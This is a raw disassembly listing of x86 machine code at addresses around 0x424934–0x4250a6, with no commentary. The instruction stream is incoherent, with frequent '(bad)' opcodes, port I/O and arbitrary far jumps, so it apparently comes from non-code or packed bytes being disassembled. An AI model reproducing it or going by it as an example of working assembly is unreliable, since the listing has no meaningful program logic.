  424934:	out    0xa5,al
  424936:	and    esp,DWORD PTR [ecx-0x54d3effc]
  42493c:	push   cs
  42493d:	dec    ebp
  42493e:	add    eax,0xcd656f59
  424943:	push   es
  424944:	ds call 0xaec95e43
  42494a:	push   0x55
  42494c:	mul    DWORD PTR [edx-0xa]
  42494f:	sub    bh,dh
  424951:	mov    dh,0x19
  424953:	outs   dx,DWORD PTR ds:[esi]
  424954:	mov    dh,0xd2
  424956:	mov    BYTE PTR [edi],al
  424958:	jmp    0xa413:0x9c18fc54
  42495f:	mov    eax,0x372f4772
  424964:	cmovb  ecx,DWORD PTR [eax]
  424967:	or     eax,0xb7b70d16
  42496c:	inc    ebx
  42496d:	daa    
  42496e:	and    BYTE PTR [edi+ebx*1+0x71],bl
  424972:	jno    0x4249cf
  424974:	je     0x42493e
  424976:	cmp    dl,BYTE PTR [esi]
  424978:	inc    esp
  424979:	inc    esi
  42497a:	fcmovu st,st(1)
  42497c:	cwde   
  42497d:	jg     0x424916
  42497f:	add    al,0x6
  424981:	mov    ds:0x7729c8fe,eax
  424986:	add    al,0x16
  424988:	das    
  424989:	rcl    DWORD PTR [ebx+edi*2],0x5c
  42498d:	test   BYTE PTR [eax+0x1b039c07],dl
  424993:	add    ch,cl
  424995:	dec    ebx
  424996:	dec    ecx
  424997:	fwait
  424998:	dec    edx
  424999:	sbb    ebx,DWORD PTR [eax]
  42499b:	mov    edi,0x6d98e421
  4249a0:	and    al,0xdd
  4249a2:	sbb    eax,0xc5ce277d
  4249a7:	shr    DWORD PTR [eax],1
  4249a9:	lea    edi,[edx+edi*8+0x48]
  4249ad:	outs   dx,DWORD PTR ds:[esi]
  4249ae:	xlat   BYTE PTR ds:[ebx]
  4249af:	cmp    DWORD PTR [edx],0xffffffd8
  4249b2:	inc    esp
  4249b3:	int    0xd
  4249b5:	dec    ebx
  4249b6:	jecxz  0x4249a1
  4249b8:	mov    edi,0x9a350e8e
  4249bd:	pop    ebx
  4249be:	retf   0xea
  4249c1:	add    BYTE PTR [edx-0x5b61f90],ch
  4249c7:	fldcw  WORD PTR [ebx-0x35bf70d]
  4249cd:	loopne 0x424a1f
  4249cf:	push   esi
  4249d0:	add    cl,al
  4249d2:	cs mov ebp,0x3260001
  4249d8:	add    BYTE PTR [eax],al
  4249da:	xor    edi,DWORD PTR [ebx]
  4249dc:	mov    ds:0x6089f4c,al
  4249e1:	jne    0x4249fe
  4249e3:	loop   0x42496b
  4249e5:	and    ebx,DWORD PTR [edx+edx*4-0x31]
  4249e9:	in     eax,0xf7
  4249eb:	pop    ebp
  4249ec:	inc    edx
  4249ed:	clc    
  4249ee:	xor    edi,DWORD PTR [edi+0x4e79e539]
  4249f4:	test   BYTE PTR [ebx-0x60],ch
  4249f7:	cmp    al,0xb3
  4249f9:	ror    BYTE PTR [esi],cl
  4249fb:	psubsb mm4,mm0
  4249fe:	ja     0x424a0f
  424a00:	sbb    ch,ch
  424a02:	inc    esp
  424a03:	push   ecx
  424a04:	imul   eax,DWORD PTR [ebp+0x30],0x1a
  424a08:	ds test eax,0x36bfe15
  424a0e:	sub    eax,0xdb6983f2
  424a14:	adc    al,BYTE PTR [eax+0x64]
  424a17:	cmp    al,0x96
  424a19:	out    0x25,eax
  424a1b:	jo     0x424a47
  424a1d:	and    al,0x54
  424a1f:	mov    esp,0x7c1b3fef
  424a24:	pop    ss
  424a25:	outs   dx,DWORD PTR ds:[esi]
  424a26:	add    ch,BYTE PTR [ecx+0x7ff6e7be]
  424a2c:	sub    ebx,edi
  424a2e:	popf   
  424a2f:	jg     0x4249eb
  424a31:	(bad)  
  424a32:	cmp    DWORD PTR [esi],eax
  424a34:	fcom   QWORD PTR [ebx+0x2d1e6b69]
  424a3a:	or     al,0xc1
  424a3c:	test   ch,cl
  424a3e:	cld    
  424a3f:	xor    al,0xa6
  424a41:	js     0x4249da
  424a43:	psubq  mm3,QWORD PTR [edx+0x5f]
  424a47:	cmc    
  424a48:	push   0xffffffce
  424a4a:	hlt    
  424a4b:	pop    ss
  424a4c:	lods   eax,DWORD PTR ds:[esi]
  424a4d:	mov    dl,0xbf
  424a4f:	aam    0xe7
  424a51:	xchg   ebp,eax
  424a52:	mov    esi,0x53f637c1
  424a57:	jl     0x424a4f
  424a59:	mov    ecx,0x182ae891
  424a5e:	jbe    0x4249e2
  424a60:	inc    ebx
  424a61:	int3   
  424a62:	adc    BYTE PTR [edi+0x6a],bh
  424a65:	xchg   edi,eax
  424a66:	jo     0x424a18
  424a68:	dec    ebx
  424a69:	and    dl,cl
  424a6b:	outs   dx,DWORD PTR ds:[esi]
  424a6c:	js     0x424ac3
  424a6e:	nop
  424a6f:	cmp    dl,ah
  424a71:	pop    ss
  424a72:	inc    esp
  424a73:	out    0xe9,al
  424a75:	fs xchg ebx,eax
  424a77:	xchg   ebp,eax
  424a78:	sbb    BYTE PTR [edi-0x14],bl
  424a7b:	addr16 dec edi
  424a7d:	stos   BYTE PTR es:[edi],al
  424a7e:	jb     0x424a62
  424a80:	stc    
  424a81:	rcr    BYTE PTR [ebx],cl
  424a83:	out    0xfe,al
  424a85:	test   BYTE PTR [ebx+0x5281c30b],dl
  424a8b:	mov    BYTE PTR [esi],bl
  424a8d:	rcl    DWORD PTR [eax],cl
  424a8f:	jl     0x424a6c
  424a91:	jg     0x424aa2
  424a93:	xor    BYTE PTR ds:0x747a03c,0xd6
  424a9a:	mov    dl,BYTE PTR [ebx]
  424a9c:	adc    BYTE PTR [eax+0x6b],0xf8
  424aa0:	inc    edi
  424aa1:	(bad)  
  424aa2:	pushf  
  424aa3:	and    edx,edi
  424aa5:	mov    bl,0x49
  424aa7:	scas   al,BYTE PTR es:[edi]
  424aa8:	not    BYTE PTR [edx+0x628c06af]
  424aae:	push   ebp
  424aaf:	cs and ecx,ebp
  424ab2:	in     eax,dx
  424ab3:	in     eax,dx
  424ab4:	aaa    
  424ab5:	pusha  
  424ab6:	and    DWORD PTR [edi-0x42],edx
  424ab9:	ins    DWORD PTR es:[edi],dx
  424aba:	xor    edx,edx
  424abc:	push   es
  424abd:	mov    edx,0x55126006
  424ac2:	cmp    esp,DWORD PTR ds:0xfe8cd9d5
  424ac8:	cwde   
  424ac9:	xchg   BYTE PTR [edx+0x60],dl
  424acc:	and    eax,0xafa762a1
  424ad1:	jbe    0x424b4d
  424ad3:	popa   
  424ad4:	inc    ecx
  424ad5:	nop
  424ad6:	clc    
  424ad7:	dec    esi
  424ad8:	mov    eax,ds:0x7fe7c70
  424add:	scas   al,BYTE PTR es:[edi]
  424ade:	sbb    al,0x9c
  424ae0:	push   0x743d90ab
  424ae5:	pop    ds
  424ae6:	out    dx,al
  424ae7:	mov    al,0x48
  424ae9:	xchg   BYTE PTR [eax],bl
  424aeb:	xor    dl,ah
  424aed:	fidivr DWORD PTR [ebx+0x2360d98c]
  424af3:	call   0x24db:0x27aab4ed
  424afa:	ja     0x424b63
  424afc:	and    cl,al
  424afe:	repz xor eax,0xb3a1b4a0
  424b04:	adc    BYTE PTR [ebp+0x39],dl
  424b07:	ins    DWORD PTR es:[edi],dx
  424b08:	(bad)  
  424b09:	cmp    al,0xaa
  424b0b:	mov    edi,0xa495ca2b
  424b10:	mov    eax,0xc639b4c9
  424b15:	mov    cl,0x4
  424b17:	inc    eax
  424b18:	pop    ecx
  424b19:	add    al,0xfb
  424b1b:	loop   0x424b74
  424b1d:	scas   eax,DWORD PTR es:[edi]
  424b1e:	sub    eax,0x8d26e90b
  424b23:	jns    0x424acb
  424b25:	and    DWORD PTR [eax-0x55c84856],ebp
  424b2b:	inc    eax
  424b2c:	retf   0x8f8d
  424b2f:	pusha  
  424b30:	jecxz  0x424ad3
  424b32:	outs   dx,DWORD PTR ds:[esi]
  424b33:	push   edx
  424b34:	scas   eax,DWORD PTR es:[edi]
  424b35:	and    eax,0x1ef55b8f
  424b3a:	pop    ss
  424b3b:	div    cl
  424b3d:	rol    DWORD PTR [ebx],0xf9
  424b40:	mov    edx,0xc785276
  424b45:	stos   DWORD PTR es:[edi],eax
  424b46:	and    BYTE PTR [esi+0x1],bl
  424b49:	pop    ebx
  424b4a:	fmul   DWORD PTR [ebx]
  424b4c:	xor    esp,DWORD PTR [ebx-0x6784964]
  424b52:	stos   DWORD PTR es:[di],eax
  424b54:	popa   
  424b55:	inc    eax
  424b56:	call   0x7236:0xd722e044
  424b5d:	fcmovu st,st(6)
  424b5f:	in     eax,0x8b
  424b61:	xor    eax,DWORD PTR [eax]
  424b63:	div    BYTE PTR [edx]
  424b65:	pop    ecx
  424b66:	inc    edi
  424b67:	xor    BYTE PTR [ebx-0x4a],cl
  424b6a:	xchg   edi,eax
  424b6b:	or     ecx,eax
  424b6d:	jl     0x424bd1
  424b6f:	fcom   QWORD PTR [eax+0x64d164ce]
  424b75:	adc    DWORD PTR [esi],ecx
  424b77:	push   ds
  424b78:	push   ebx
  424b79:	stos   BYTE PTR es:[edi],al
  424b7a:	and    edi,DWORD PTR [ebp-0xd]
  424b7d:	dec    esi
  424b7e:	mov    edi,0x1f19cd24
  424b83:	mov    ebx,0x9351d766
  424b88:	data16 sbb dh,BYTE PTR [ebx]
  424b8b:	dec    esi
  424b8c:	pop    ebx
  424b8d:	cli    
  424b8e:	loop   0x424bfe
  424b90:	in     eax,dx
  424b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b92:	arpl   sp,cx
  424b94:	add    DWORD PTR [edi+0x1ac25329],ebp
  424b9a:	cmp    DWORD PTR [ecx+0x37304691],0xda2eddc1
  424ba4:	lahf   
  424ba5:	(bad)  
  424ba6:	out    0xf4,eax
  424ba8:	jns    0x424b4a
  424baa:	aam    0x1a
  424bac:	adc    BYTE PTR [esi+0x71],0x7c
  424bb0:	out    dx,al
  424bb1:	sbb    DWORD PTR [eax],edx
  424bb3:	lods   al,BYTE PTR ds:[esi]
  424bb4:	xchg   ebx,eax
  424bb5:	xlat   BYTE PTR ds:[ebx]
  424bb6:	push   ebp
  424bb7:	xor    DWORD PTR [ebx+0x1e],0xffffff9a
  424bbb:	inc    esi
  424bbc:	(bad)  
  424bbd:	sbb    ecx,DWORD PTR ds:0xec8afaf9
  424bc3:	cs pop ds
  424bc5:	pop    esp
  424bc6:	add    ch,BYTE PTR [eax-0x7406f94]
  424bcc:	or     ebp,ebp
  424bce:	or     al,0xa2
  424bd0:	in     eax,0x23
  424bd2:	mov    DWORD PTR [ebp-0x5105b29e],esi
  424bd8:	xchg   ecx,eax
  424bd9:	dec    esp
  424bda:	test   eax,0x4b3c5b07
  424bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424be0:	pop    ds
  424be1:	cwde   
  424be2:	sub    eax,0x4c9cd4d1
  424be7:	pop    ss
  424be8:	adc    eax,DWORD PTR [ecx+0x4d]
  424beb:	sub    ebx,DWORD PTR [edi-0xd]
  424bee:	cs add eax,0x8333b171
  424bf4:	mov    dl,0x56
  424bf6:	cmp    eax,0x8de57ce1
  424bfb:	xor    BYTE PTR [edx+0x59921b58],bl
  424c01:	jg     0x424c53
  424c03:	pop    ebx
  424c04:	icebp  
  424c05:	xchg   esp,eax
  424c06:	xchg   BYTE PTR [ebx-0x58aad1ce],ch
  424c0c:	and    BYTE PTR [ecx+0x188a2217],0x1a
  424c13:	fbstp  TBYTE PTR [esi-0x51]
  424c16:	out    0xdf,eax
  424c18:	dec    esp
  424c19:	ins    DWORD PTR es:[edi],dx
  424c1a:	adc    al,0xa9
  424c1c:	es dec esi
  424c1e:	test   ebp,edx
  424c20:	jg     0x424bd8
  424c22:	fcom   st(6)
  424c24:	sti    
  424c25:	cmp    eax,0xde12e0a
  424c2a:	jmp    0x97636341
  424c2f:	rol    BYTE PTR [ecx],0x6b
  424c32:	xchg   eax,esi
  424c34:	test   eax,0xa6b996c4
  424c39:	adc    eax,0xfc118a9
  424c3e:	push   0x7bde82b6
  424c43:	pop    ebx
  424c44:	pop    ebp
  424c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c46:	ret    
  424c47:	ror    BYTE PTR [ecx],1
  424c49:	loop   0x424ca4
  424c4b:	(bad)  
  424c4c:	pop    ds
  424c4d:	in     eax,0x34
  424c4f:	inc    esi
  424c50:	lahf   
  424c51:	loopne 0x424bf6
  424c53:	mov    ch,0xb0
  424c55:	push   ds
  424c56:	mov    esi,0x8318bdc6
  424c5b:	in     eax,0x73
  424c5d:	cmp    ah,al
  424c5f:	int    0x8c
  424c61:	fsubr  st,st(5)
  424c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c64:	mov    ebx,0xb7d63636
  424c69:	sahf   
  424c6a:	sbb    ecx,DWORD PTR [ebp+0x64f71bf0]
  424c70:	imul   esi,DWORD PTR [eax],0x7f4ffead
  424c76:	aas    
  424c77:	xchg   ebp,eax
  424c78:	and    ch,BYTE PTR [eax+ebx*1-0x498ffa9f]
  424c7f:	sub    ebp,edi
  424c81:	mov    eax,ds:0x83ae6562
  424c86:	inc    esp
  424c87:	mov    edi,0x74a18040
  424c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c8d:	and    ecx,DWORD PTR [edi-0x5a7b1c2b]
  424c93:	shl    BYTE PTR [edi-0x43cd3803],0xb
  424c9a:	(bad)  
  424c9c:	inc    ecx
  424c9e:	xor    BYTE PTR [ebx+0x12],dl
  424ca1:	retf   0x47c8
  424ca4:	jle    0x424c75
  424ca6:	ffree  st(1)
  424ca8:	inc    eax
  424ca9:	mov    esp,0x8beef65f
  424cae:	outs   dx,DWORD PTR ds:[esi]
  424caf:	adc    ah,BYTE PTR [esi]
  424cb1:	out    0x99,eax
  424cb3:	add    ebp,ebx
  424cb5:	dec    ecx
  424cb6:	adc    al,0x6b
  424cb8:	xlat   BYTE PTR ds:[ebx]
  424cb9:	(bad)  
  424cba:	sbb    al,0xe0
  424cbc:	mov    edi,DWORD PTR [edi+0x7bc45312]
  424cc2:	xchg   ebx,eax
  424cc3:	(bad)  
  424cc4:	test   ah,0x77
  424cc7:	popa   
  424cc8:	adc    al,0xc3
  424cca:	(bad)  
  424ccb:	lock jno 0x424c5e
  424cce:	(bad)  [eax-0x60]
  424cd1:	aam    0x36
  424cd3:	xchg   edi,eax
  424cd4:	je     0x424c80
  424cd6:	ror    ah,0x1
  424cd9:	xchg   esi,eax
  424cda:	cld    
  424cdb:	js     0x424d32
  424cdd:	stc    
  424cde:	and    DWORD PTR [edx],ebp
  424ce0:	or     DWORD PTR [edi-0x7f367e76],0xffffff8d
  424ce7:	addr16 mov al,ds:0x5b71
  424ceb:	sbb    dl,ah
  424ced:	enter  0xae13,0x41
  424cf1:	mov    eax,ds:0xd0e743ac
  424cf6:	lock enter 0x4b9d,0x0
  424cfb:	push   eax
  424cfc:	xchg   ebp,eax
  424cfd:	dec    edi
  424cfe:	adc    DWORD PTR [edi+0x0],esp
  424d01:	add    BYTE PTR [edx-0x79],cl
  424d04:	push   edx
  424d05:	dec    esp
  424d06:	(bad)  
  424d08:	pop    esi
  424d09:	xchg   eax,esp
  424d0b:	js     0x424c8e
  424d0d:	mov    ebx,0xa3a85e1d
  424d12:	push   esp
  424d13:	rol    BYTE PTR [ecx],0x0
  424d16:	add    eax,DWORD PTR es:[eax]
  424d19:	add    BYTE PTR [ecx],bh
  424d1b:	call   0xf86f:0x12f383cb
  424d22:	mov    edx,0x4ca34970
  424d27:	mov    dl,0x84
  424d29:	outs   dx,DWORD PTR ds:[esi]
  424d2a:	(bad)  
  424d2b:	sbb    ebx,esp
  424d2d:	mov    al,ds:0x11516da
  424d32:	out    dx,eax
  424d33:	das    
  424d34:	pop    esi
  424d35:	dec    eax
  424d36:	dec    ecx
  424d37:	scas   al,BYTE PTR es:[edi]
  424d38:	fisubr DWORD PTR [ebx-0x12]
  424d3b:	out    0xd,al
  424d3d:	sub    DWORD PTR [eax],esi
  424d3f:	jmp    0x424da6
  424d41:	pop    ss
  424d42:	stos   BYTE PTR es:[edi],al
  424d43:	mov    edi,db5
  424d46:	in     eax,dx
  424d47:	rcr    BYTE PTR [esi+edi*2],1
  424d4a:	add    al,0x5d
  424d4c:	push   cs
  424d4d:	push   esi
  424d4e:	loopne 0x424cdb
  424d50:	pushf  
  424d51:	pushf  
  424d52:	add    ecx,DWORD PTR [eax]
  424d54:	das    
  424d55:	div    DWORD PTR [edi]
  424d57:	loope  0x424d0e
  424d59:	pushf  
  424d5a:	cld    
  424d5b:	xchg   edi,eax
  424d5c:	mov    ebp,0x13034a80
  424d61:	mov    DWORD PTR [ecx+edi*8+0x7b61e72b],0x35d4ae61
  424d6c:	sbb    BYTE PTR [ecx-0x61],bl
  424d6f:	inc    esp
  424d70:	inc    edx
  424d71:	jmp    0x7f08:0xef3839af
  424d78:	dec    edx
  424d79:	jno    0x424deb
  424d7b:	data16 fdivr st,st(6)
  424d7e:	imul   BYTE PTR [edi-0x7e771c57]
  424d84:	dec    ebp
  424d85:	repz or esi,ebp
  424d88:	sbb    edi,DWORD PTR [ebx]
  424d8a:	ins    BYTE PTR es:[edi],dx
  424d8b:	repz scas al,BYTE PTR es:[edi]
  424d8d:	sti    
  424d8e:	mov    al,0x61
  424d90:	pop    ecx
  424d91:	idiv   DWORD PTR [ebp+0x1ef2379d]
  424d97:	sar    DWORD PTR [ebp+0x5ab0cdb],1
  424d9d:	xchg   ebx,eax
  424d9e:	rcr    DWORD PTR ds:[ebp+0x3be23f52],0x82
  424da6:	adc    edi,edx
  424da8:	mov    ebp,0x49355a61
  424dad:	popa   
  424dae:	(bad)  
  424daf:	out    0x2c,eax
  424db1:	shl    edx,cl
  424db3:	stc    
  424db4:	jmp    0x424da1
  424db6:	arpl   WORD PTR [ebx-0x438e41ec],bp
  424dbc:	sbb    eax,0xb71c34d0
  424dc1:	call   0x89f3:0x3301057c
  424dc8:	popa   
  424dc9:	or     esi,DWORD PTR [ebx-0x11]
  424dcc:	nop
  424dcd:	adc    DWORD PTR [edi-0x65],edx
  424dd0:	mov    dh,0x55
  424dd2:	sahf   
  424dd3:	aas    
  424dd4:	pop    es
  424dd5:	das    
  424dd6:	loop   0x424d8c
  424dd8:	fmul   QWORD PTR [ecx+0x668a80f9]
  424dde:	dec    esp
  424ddf:	inc    ebp
  424de0:	xchg   ebx,eax
  424de1:	inc    eax
  424de2:	xchg   BYTE PTR [ebx+0x17],al
  424de5:	or     ebx,DWORD PTR [ecx+0x2c]
  424de8:	or     eax,DWORD PTR ds:0x3b3aaacd
  424dee:	xchg   BYTE PTR [edx-0x7c],bh
  424df1:	mov    edi,0xdac602bc
  424df6:	icebp  
  424df7:	xor    al,0x5f
  424df9:	test   eax,0xd19627f5
  424dfe:	jmp    DWORD PTR [ebp-0x30]
  424e01:	or     DWORD PTR ds:0xb860000d,ecx
  424e07:	mov    dl,0x31
  424e09:	and    BYTE PTR [eax-0x6c],al
  424e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e0d:	dec    eax
  424e0e:	popa   
  424e0f:	scas   eax,DWORD PTR es:[edi]
  424e10:	test   DWORD PTR [ebp-0x5c],ecx
  424e13:	icebp  
  424e14:	adc    DWORD PTR [ebx-0x13],ecx
  424e17:	leave  
  424e18:	inc    esp
  424e19:	push   eax
  424e1a:	push   esi
  424e1b:	scas   al,BYTE PTR es:[edi]
  424e1c:	inc    esi
  424e1d:	jmp    0xe0a2bc2
  424e22:	push   edx
  424e23:	and    edx,ebx
  424e25:	inc    edi
  424e26:	cwde   
  424e27:	(bad)  
  424e28:	fiadd  WORD PTR [ebx-0x56926013]
  424e2e:	les    esp,FWORD PTR [esi-0x21c76ffd]
  424e34:	fs aad 0xd7
  424e37:	jmp    0x80db1c2a
  424e3c:	add    bh,ch
  424e3e:	xor    BYTE PTR [edx+edx*8],ch
  424e41:	cli    
  424e42:	in     eax,0xcc
  424e44:	leave  
  424e45:	pusha  
  424e46:	imul   ecx,edi,0xffffff9c
  424e49:	stos   DWORD PTR es:[edi],eax
  424e4a:	jmp    0xb525:0x5d74b98b
  424e51:	pusha  
  424e52:	xchg   ebx,eax
  424e53:	xchg   BYTE PTR [ebx],dl
  424e55:	pop    ds
  424e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e57:	lods   al,BYTE PTR ds:[esi]
  424e58:	pop    es
  424e59:	add    esp,DWORD PTR [edx+0x42d0bca3]
  424e5f:	jl     0x424e5c
  424e61:	xor    dl,dl
  424e63:	adc    ebx,DWORD PTR [edx]
  424e65:	xchg   DWORD PTR [ebp-0x6072e07e],ebp
  424e6b:	or     al,ah
  424e6d:	push   0x4c61124e
  424e72:	call   0x70e4c32c
  424e77:	xor    ch,bl
  424e79:	cmp    bl,dl
  424e7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e7c:	adc    esp,DWORD PTR [edx]
  424e7e:	aaa    
  424e7f:	and    al,BYTE PTR [esi]
  424e81:	sahf   
  424e82:	pusha  
  424e83:	fwait
  424e84:	push   edx
  424e85:	out    0xfd,eax
  424e87:	xor    bh,BYTE PTR [ebp+0x67eacca8]
  424e8d:	mov    dl,0x61
  424e8f:	mov    al,BYTE PTR [edi-0x2c]
  424e92:	loop   0x424ef1
  424e94:	mov    WORD PTR [ecx],fs
  424e96:	ja     0x424e60
  424e98:	shl    bh,cl
  424e9a:	es and al,0x7c
  424e9d:	and    bl,BYTE PTR [edx]
  424e9f:	sub    BYTE PTR [edi+0x15],dl
  424ea2:	mov    ah,0x2c
  424ea4:	test   cl,dh
  424ea6:	ja     0x424e72
  424ea8:	push   ds
  424ea9:	repz loopne 0x424ece
  424eac:	rcl    BYTE PTR [eax-0x59fc04e8],0x52
  424eb3:	ja     0x424e6e
  424eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424eb6:	dec    eax
  424eb7:	adc    ebp,esi
  424eb9:	icebp  
  424eba:	lds    edx,FWORD PTR [edx+0x2e]
  424ebd:	xlat   BYTE PTR ds:[ebx]
  424ebe:	push   edx
  424ebf:	mov    eax,ds:0x3820bf62
  424ec4:	std    
  424ec5:	cmp    BYTE PTR [ebp+0xb],bh
  424ec8:	pop    edx
  424ec9:	sub    eax,0x8bf6d842
  424ece:	dec    ebx
  424ecf:	mov    dh,0x53
  424ed1:	stos   DWORD PTR es:[edi],eax
  424ed2:	sbb    ah,BYTE PTR [eax]
  424ed4:	jb     0x424e5c
  424ed6:	pop    edx
  424ed7:	push   ds
  424ed8:	in     al,dx
  424ed9:	pop    edx
  424eda:	push   ebp
  424edb:	sub    al,0x16
  424edd:	pop    esi
  424ede:	outs   dx,DWORD PTR ds:[esi]
  424edf:	pop    ecx
  424ee0:	mov    edi,DWORD PTR [ecx-0x7e622851]
  424ee6:	pop    eax
  424ee7:	jmp    0x424ed7
  424ee9:	test   DWORD PTR [edi],ebp
  424eeb:	int3   
  424eec:	cmp    BYTE PTR ss:[edi],ah
  424eef:	stos   DWORD PTR es:[edi],eax
  424ef0:	inc    edi
  424ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ef3:	in     eax,0x16
  424ef5:	iret   
  424ef6:	shl    BYTE PTR [eax+0x78caec7b],1
  424efc:	and    BYTE PTR ss:[ebp+0x6d],bh
  424f00:	pop    edi
  424f01:	add    esi,DWORD PTR [ecx-0x63]
  424f04:	pusha  
  424f05:	jmp    0x22dad8ec
  424f0a:	shr    bh,0x9d
  424f0d:	add    esp,DWORD PTR [ebp+0x49]
  424f10:	and    eax,0x475d7481
  424f15:	out    0x53,eax
  424f17:	daa    
  424f18:	xor    esp,esi
  424f1a:	inc    ebp
  424f1b:	sar    edx,0x10
  424f1e:	dec    eax
  424f1f:	mov    esp,0xed50e304
  424f24:	sub    al,0x54
  424f26:	daa    
  424f27:	jecxz  0x424f6c
  424f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f2a:	push   ss
  424f2b:	or     al,0xe4
  424f2d:	ins    DWORD PTR es:[edi],dx
  424f2e:	xlat   BYTE PTR ds:[ebx]
  424f2f:	jae    0x424ee2
  424f31:	fdiv   DWORD PTR [edi+0x2c37ac48]
  424f37:	xor    esp,DWORD PTR [eax+0x40db1bac]
  424f3d:	loopne 0x424f38
  424f3f:	out    dx,eax
  424f40:	sahf   
  424f41:	(bad)  
  424f42:	int    0x6f
  424f44:	loope  0x424f66
  424f46:	sub    BYTE PTR [edi],cl
  424f48:	leave  
  424f49:	imul   esp,eax,0xb
  424f4c:	pop    esp
  424f4d:	adc    bl,BYTE PTR [eax]
  424f4f:	repnz ss pop es
  424f52:	jae    0x424f19
  424f54:	hlt    
  424f55:	or     al,0x4d
  424f57:	mov    dl,0x27
  424f59:	dec    ecx
  424f5a:	das    
  424f5b:	xor    DWORD PTR [esi],ebp
  424f5d:	pop    es
  424f5e:	daa    
  424f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f60:	push   cs
  424f61:	inc    edx
  424f62:	jbe    0x424f66
  424f64:	pop    ss
  424f65:	mov    bl,0x61
  424f67:	test   eax,0x94b3ac60
  424f6c:	inc    ebp
  424f6d:	or     BYTE PTR [edx],bl
  424f6f:	push   esi
  424f70:	mov    ah,0x55
  424f72:	(bad)  
  424f73:	mov    al,0x62
  424f75:	mov    al,0xd
  424f77:	add    eax,0xfbaf5c11
  424f7c:	stc    
  424f7d:	test   eax,0xa9c906f8
  424f82:	push   ds
  424f83:	or     al,0xb2
  424f85:	stc    
  424f86:	xor    ch,BYTE PTR [edx+0x37]
  424f89:	and    esp,DWORD PTR [ebx]
  424f8b:	cmp    BYTE PTR [eax-0x176c15f4],0xc5
  424f92:	cmp    BYTE PTR [ebx],cl
  424f94:	sahf   
  424f95:	pop    ecx
  424f96:	push   ecx
  424f97:	ja     0x424f33
  424f99:	shr    DWORD PTR [ecx-0x790bef75],0xc1
  424fa0:	ret    
  424fa1:	pop    ds
  424fa2:	pusha  
  424fa3:	pop    eax
  424fa4:	hlt    
  424fa5:	and    eax,0xc656e4e1
  424faa:	sti    
  424fab:	mov    ah,0xa6
  424fad:	lds    ebx,FWORD PTR [ecx+0x942b355]
  424fb3:	push   ebp
  424fb4:	arpl   WORD PTR [esi+0x5f27f0d5],bp
  424fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fbb:	push   eax
  424fbc:	and    eax,DWORD PTR ss:[eax-0x19324d62]
  424fc3:	test   BYTE PTR [ebx-0x65],al
  424fc6:	jo     0x42501f
  424fc8:	test   BYTE PTR [ebp+0x3948e111],ah
  424fce:	add    BYTE PTR [ecx+ebx*2],ch
  424fd1:	adc    al,0xfd
  424fd3:	and    DWORD PTR [edx],edi
  424fd5:	mov    eax,ds:0x4c9a302c
  424fda:	pop    edi
  424fdb:	and    eax,0xb6714cb2
  424fe0:	xlat   BYTE PTR ds:[ebx]
  424fe1:	jmp    FWORD PTR [edi+0x316ec7ea]
  424fe7:	sahf   
  424fe8:	je     0x425065
  424fea:	or     dl,BYTE PTR [eax]
  424fec:	js     0x424fec
  424fee:	(bad)  
  424fef:	pop    eax
  424ff0:	into   
  424ff1:	test   al,0x5b
  424ff3:	pop    ecx
  424ff4:	add    eax,0xa04cb39f
  424ff9:	dec    ecx
  424ffa:	add    DWORD PTR [ebx+0x20ca13c8],ebx
  425000:	loopne 0x42505c
  425002:	dec    edx
  425003:	or     al,0xdd
  425005:	je     0x42503b
  425007:	jge    0x42503a
  425009:	dec    ecx
  42500a:	pop    es
  42500b:	push   edx
  42500c:	and    BYTE PTR [eax+0x72850b77],dh
  425012:	imul   esi,DWORD PTR [ecx],0xffffffc6
  425015:	pop    ebx
  425016:	jg     0x424fad
  425018:	add    ax,WORD PTR [eax-0x156564d6]
  42501f:	inc    edi
  425020:	cmp    ah,BYTE PTR [edx]
  425022:	in     al,0x41
  425024:	out    0xce,eax
  425026:	cs inc edi
  425028:	jo     0x42503d
  42502a:	pop    ebp
  42502b:	mov    al,0x3d
  42502d:	sahf   
  42502e:	and    BYTE PTR [ebx+0x64fc8928],0x19
  425035:	sub    ebp,esi
  425037:	sbb    ah,al
  425039:	lahf   
  42503a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42503c:	sub    edi,DWORD PTR [edx-0x5e]
  42503f:	aam    0x0
  425041:	add    BYTE PTR [edx],cl
  425043:	xchg   edx,eax
  425044:	jl     0x42507f
  425046:	cld    
  425047:	dec    DWORD PTR [edi-0x4d]
  42504a:	in     al,dx
  42504b:	jo     0x425004
  42504d:	lea    ecx,ds:0x7a7d65a4
  425053:	ret    
  425054:	add    DWORD PTR [eax],eax
  425056:	add    eax,DWORD PTR es:[eax]
  425059:	add    BYTE PTR [esi],ch
  42505b:	je     0x425056
  42505d:	adc    DWORD PTR [ebx+0x11],esp
  425060:	jle    0x42502e
  425062:	push   esi
  425063:	sub    BYTE PTR [eax],dl
  425065:	sbb    eax,0x4202c39b
  42506a:	addr16 add al,0xc4
  42506d:	mov    ss,WORD PTR [edi+eax*4]
  425070:	mov    bh,0xf7
  425072:	out    dx,al
  425073:	or     edx,DWORD PTR [edx]
  425075:	push   edi
  425076:	mov    DWORD PTR [edx-0x5b4da79d],esp
  42507c:	mov    ds:0x5bff5e67,al
  425081:	dec    edi
  425082:	lea    ecx,ds:0xeedbf146
  425088:	imul   edi,DWORD PTR [ebx-0x45302cbd],0xffffff91
  42508f:	sbb    bh,cl
  425091:	jbe    0x4250bb
  425093:	call   0x2fbe6a8e
  425098:	(bad)  
  425099:	xchg   esi,eax
  42509a:	or     DWORD PTR [edx],eax
  42509c:	and    BYTE PTR [esi-0x1f],dh
  42509f:	adc    edi,esi
  4250a1:	or     dh,BYTE PTR gs:[ecx]
  4250a4:	pop    bx
  4250a6:	push   ss
